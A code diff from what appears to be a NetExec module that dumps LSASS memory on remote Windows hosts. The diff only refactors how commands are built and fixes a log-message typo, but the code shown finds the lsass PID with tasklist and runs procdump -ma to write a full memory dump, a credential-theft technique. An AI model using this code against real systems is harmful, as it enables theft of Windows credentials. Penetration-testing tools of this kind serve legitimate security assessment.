@@ -64,11 +64,10 @@ class NXCModule:
                 context.log.fail(f"Error writing file to share {self.share}: {e}")
 
         # get pid lsass
-        command = 'tasklist /v /fo csv | findstr /i "lsass"'
-        context.log.display(f"Getting lsass PID {command}")
-        p = connection.execute(command, True)
+        context.log.display("Getting lsass PID")
+        p = connection.execute('tasklist /v /fo csv | findstr /i "lsass"', True)
         pid = p.split(",")[1][1:-1]
-        command = self.tmp_dir + self.procdump + " -accepteula -ma " + pid + " " + self.tmp_dir + "%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
+        command = f"{self.tmp_dir}{self.procdump} -accepteula -ma {pid} {self.tmp_dir}%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
         context.log.display(f"Executing command {command}")
         p = connection.execute(command, True)
         context.log.debug(p)
@@ -77,7 +76,7 @@ class NXCModule:
             context.log.success("Process lsass.exe was successfully dumped")
             dump = True
         else:
-            context.log.fail("Process lsass.exe error un dump, try with verbose")
+            context.log.fail("Process lsass.exe error while dumping, try with verbose")
 
         if not dump:
             self.delete_procdump_binary(connection, context)
